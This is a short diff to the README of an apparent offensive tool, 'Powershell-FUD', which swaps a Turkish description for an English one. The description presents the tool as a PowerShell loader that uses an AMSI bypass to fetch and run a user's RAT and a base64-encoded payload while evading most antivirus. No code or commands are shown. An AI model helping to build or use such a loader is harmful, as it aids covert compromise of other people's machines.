@@ -1,2 +1,2 @@
 # Powershell-FUD
-amsi bypass kullanarak, rat'inizin indirme bağlantısını ve base64 ile şifrelediğiniz txt dosyasını indirir ve çalıştırır, böylece çoğu anti-virüsü atlayabilirsiniz
+using amsi bypass, it downloads and runs the download link of your rat and the txt file you encrypt with base64 so you can bypass most anti-viruses
